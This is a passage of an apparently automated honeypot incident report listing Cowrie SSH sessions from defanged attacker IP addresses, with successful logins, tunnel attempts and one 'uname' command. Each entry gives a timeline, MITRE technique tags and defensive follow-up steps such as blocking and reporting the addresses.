- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc84d5f1a4f1

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 20:02 |
| **Last Seen** | 2026-08-29 20:02 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:02:17` | `cowrie.session.connect` |
| `2026-08-29 20:02:17` | `cowrie.client.version` |
| `2026-08-29 20:02:17` | `cowrie.client.kex` |
| `2026-08-29 20:02:17` | `cowrie.login.success` |
| `2026-08-29 20:02:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:02:19` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 20:02:19` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e235b549588e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:06 |
| **Last Seen** | 2026-08-29 20:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:06:01` | `cowrie.session.connect` |
| `2026-08-29 20:06:01` | `cowrie.client.version` |
| `2026-08-29 20:06:01` | `cowrie.client.kex` |
| `2026-08-29 20:06:02` | `cowrie.login.success` |
| `2026-08-29 20:06:03` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:06:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:06:03` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca4905417a5a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:11 |
| **Last Seen** | 2026-08-29 20:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:11:00` | `cowrie.session.connect` |
| `2026-08-29 20:11:00` | `cowrie.client.version` |
| `2026-08-29 20:11:00` | `cowrie.client.kex` |
| `2026-08-29 20:11:01` | `cowrie.login.success` |
| `2026-08-29 20:11:02` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:11:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:11:02` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-769a2bbca136

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-29 20:12 |
| **Last Seen** | 2026-08-29 20:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:12:19` | `cowrie.session.connect` |
| `2026-08-29 20:12:20` | `cowrie.client.version` |
| `2026-08-29 20:12:20` | `cowrie.client.kex` |
| `2026-08-29 20:12:22` | `cowrie.login.success` |
| `2026-08-29 20:12:23` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120186a3259f

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-29 20:12 |
| **Last Seen** | 2026-08-29 20:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:12:33` | `cowrie.session.connect` |
| `2026-08-29 20:12:33` | `cowrie.client.version` |
| `2026-08-29 20:12:33` | `cowrie.client.kex` |
| `2026-08-29 20:12:35` | `cowrie.login.success` |
| `2026-08-29 20:12:35` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-098f820187ca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:15 |
| **Last Seen** | 2026-08-29 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:15:50` | `cowrie.session.connect` |
| `2026-08-29 20:15:50` | `cowrie.client.version` |
| `2026-08-29 20:15:51` | `cowrie.client.kex` |
| `2026-08-29 20:15:52` | `cowrie.login.success` |
| `2026-08-29 20:15:52` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:15:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:15:52` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90dd2137a98a

| Field | Detail |
|---|---|
| **Source IP** | `182.92.242[.]181` |
| **First Seen** | 2026-08-29 20:20 |
| **Last Seen** | 2026-08-29 20:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:20:12` | `cowrie.session.connect` |
| `2026-08-29 20:20:12` | `cowrie.client.version` |
| `2026-08-29 20:20:13` | `cowrie.client.kex` |
| `2026-08-29 20:20:14` | `cowrie.login.success` |
| `2026-08-29 20:20:15` | `cowrie.session.params` |
| `2026-08-29 20:20:15` | `cowrie.command.input` |
| `2026-08-29 20:20:15` | `cowrie.log.closed` |
| `2026-08-29 20:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.92.242[.]181` to AbuseIPDB if not already reported
- [ ] Block `182.92.242[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0df3ec7d4736

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:21 |
| **Last Seen** | 2026-08-29 20:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:21:50` | `cowrie.session.connect` |
| `2026-08-29 20:21:50` | `cowrie.client.version` |
| `2026-08-29 20:21:50` | `cowrie.client.kex` |
| `2026-08-29 20:21:51` | `cowrie.login.success` |
| `2026-08-29 20:21:52` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:21:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:21:52` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16faada7620c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:25 |
| **Last Seen** | 2026-08-29 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:25:20` | `cowrie.session.connect` |
| `2026-08-29 20:25:20` | `cowrie.client.version` |
| `2026-08-29 20:25:20` | `cowrie.client.kex` |
| `2026-08-29 20:25:21` | `cowrie.login.success` |
| `2026-08-29 20:25:21` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:25:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:25:21` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cdd9d3e6bdf

| Field | Detail |
|---|---|
| **Source IP** | `212.68.38[.]69` |
| **First Seen** | 2026-08-29 20:27 |
| **Last Seen** | 2026-08-29 20:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:27:30` | `cowrie.session.connect` |
| `2026-08-29 20:27:30` | `cowrie.client.version` |
| `2026-08-29 20:27:30` | `cowrie.client.kex` |
| `2026-08-29 20:27:32` | `cowrie.login.success` |
| `2026-08-29 20:27:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.68.38[.]69` to AbuseIPDB if not already reported
- [ ] Block `212.68.38[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a4240a728f

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-08-29 20:27 |
| **Last Seen** | 2026-08-29 20:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:27:42` | `cowrie.session.connect` |
| `2026-08-29 20:27:43` | `cowrie.client.version` |
| `2026-08-29 20:27:43` | `cowrie.client.kex` |
| `2026-08-29 20:27:46` | `cowrie.login.success` |
| `2026-08-29 20:27:46` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a879e19d1e23

| Field | Detail |
|---|---|
| **Source IP** | `78.155.213[.]21` |
| **First Seen** | 2026-08-29 20:30 |
| **Last Seen** | 2026-08-29 20:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:30:44` | `cowrie.session.connect` |
| `2026-08-29 20:30:45` | `cowrie.client.version` |
| `2026-08-29 20:30:45` | `cowrie.client.kex` |
| `2026-08-29 20:30:46` | `cowrie.login.success` |
| `2026-08-29 20:30:46` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.155.213[.]21` to AbuseIPDB if not already reported
- [ ] Block `78.155.213[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95855ccb56af

| Field | Detail |
|---|---|
| **Source IP** | `99.121.112[.]251` |
| **First Seen** | 2026-08-29 20:30 |
| **Last Seen** | 2026-08-29 20:31 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:30:57` | `cowrie.session.connect` |
| `2026-08-29 20:30:59` | `cowrie.client.version` |
| `2026-08-29 20:30:59` | `cowrie.client.kex` |
| `2026-08-29 20:31:06` | `cowrie.login.success` |
| `2026-08-29 20:31:09` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `99.121.112[.]251` to AbuseIPDB if not already reported
- [ ] Block `99.121.112[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ac5d0f8574

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:32 |
| **Last Seen** | 2026-08-29 20:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:32:42` | `cowrie.session.connect` |
| `2026-08-29 20:32:42` | `cowrie.client.version` |
| `2026-08-29 20:32:43` | `cowrie.client.kex` |
| `2026-08-29 20:32:43` | `cowrie.login.success` |
| `2026-08-29 20:32:44` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:32:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:32:44` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-842678f7f14f

| Field | Detail |
|---|---|
| **Source IP** | `122.187.237[.]122` |
| **First Seen** | 2026-08-29 20:33 |
| **Last Seen** | 2026-08-29 20:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:33:57` | `cowrie.session.connect` |
| `2026-08-29 20:33:58` | `cowrie.client.version` |
| `2026-08-29 20:33:58` | `cowrie.client.kex` |
| `2026-08-29 20:34:00` | `cowrie.login.success` |
| `2026-08-29 20:34:00` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.237[.]122` to AbuseIPDB if not already reported
- [ ] Block `122.187.237[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c795356ae484

| Field | Detail |
|---|---|
| **Source IP** | `111.70.11[.]78` |
| **First Seen** | 2026-08-29 20:34 |
| **Last Seen** | 2026-08-29 20:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:34:06` | `cowrie.session.connect` |
| `2026-08-29 20:34:06` | `cowrie.client.version` |
| `2026-08-29 20:34:06` | `cowrie.client.kex` |
| `2026-08-29 20:34:09` | `cowrie.login.success` |
| `2026-08-29 20:34:09` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.11[.]78` to AbuseIPDB if not already reported
- [ ] Block `111.70.11[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2940383da904

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:35 |
| **Last Seen** | 2026-08-29 20:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:35:00` | `cowrie.session.connect` |
| `2026-08-29 20:35:00` | `cowrie.client.version` |
| `2026-08-29 20:35:00` | `cowrie.client.kex` |
| `2026-08-29 20:35:01` | `cowrie.login.success` |
| `2026-08-29 20:35:01` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:35:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:35:02` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f7932b8dc47

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 20:37 |
| **Last Seen** | 2026-08-29 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:37:51` | `cowrie.session.connect` |
| `2026-08-29 20:37:51` | `cowrie.client.version` |
| `2026-08-29 20:37:51` | `cowrie.client.kex` |
| `2026-08-29 20:37:51` | `cowrie.login.success` |
| `2026-08-29 20:37:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:37:51` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5c4fe35ddf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:43 |
| **Last Seen** | 2026-08-29 20:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:43:43` | `cowrie.session.connect` |
| `2026-08-29 20:43:43` | `cowrie.client.version` |
| `2026-08-29 20:43:43` | `cowrie.client.kex` |
| `2026-08-29 20:43:44` | `cowrie.login.success` |
| `2026-08-29 20:43:44` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:43:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:43:44` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:43:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95e90d5b85d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:44 |
| **Last Seen** | 2026-08-29 20:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:44:44` | `cowrie.session.connect` |
| `2026-08-29 20:44:44` | `cowrie.client.version` |
| `2026-08-29 20:44:44` | `cowrie.client.kex` |
| `2026-08-29 20:44:45` | `cowrie.login.success` |
| `2026-08-29 20:44:45` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:44:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:44:45` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b12e5c8acd4e

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 20:44 |
| **Last Seen** | 2026-08-29 20:45 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:44:44` | `cowrie.session.connect` |
| `2026-08-29 20:44:44` | `cowrie.client.version` |
| `2026-08-29 20:44:45` | `cowrie.client.kex` |
| `2026-08-29 20:44:45` | `cowrie.login.success` |
| `2026-08-29 20:44:46` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:44:46` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 20:44:46` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a62db3312a6

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-29 20:47 |
| **Last Seen** | 2026-08-29 20:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:47:33` | `cowrie.session.connect` |
| `2026-08-29 20:47:33` | `cowrie.client.version` |
| `2026-08-29 20:47:33` | `cowrie.client.kex` |
| `2026-08-29 20:47:35` | `cowrie.login.success` |
| `2026-08-29 20:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c3ba060549

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-29 20:47 |
| **Last Seen** | 2026-08-29 20:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:47:33` | `cowrie.session.connect` |
| `2026-08-29 20:47:33` | `cowrie.client.version` |
| `2026-08-29 20:47:33` | `cowrie.client.kex` |
| `2026-08-29 20:47:35` | `cowrie.login.success` |
| `2026-08-29 20:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b395a3434f3e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:54 |
| **Last Seen** | 2026-08-29 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:54:22` | `cowrie.session.connect` |
| `2026-08-29 20:54:22` | `cowrie.client.version` |
| `2026-08-29 20:54:23` | `cowrie.client.kex` |
| `2026-08-29 20:54:23` | `cowrie.login.success` |
| `2026-08-29 20:54:24` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:54:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:54:24` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5b3edf2c06

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 20:54 |
| **Last Seen** | 2026-08-29 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
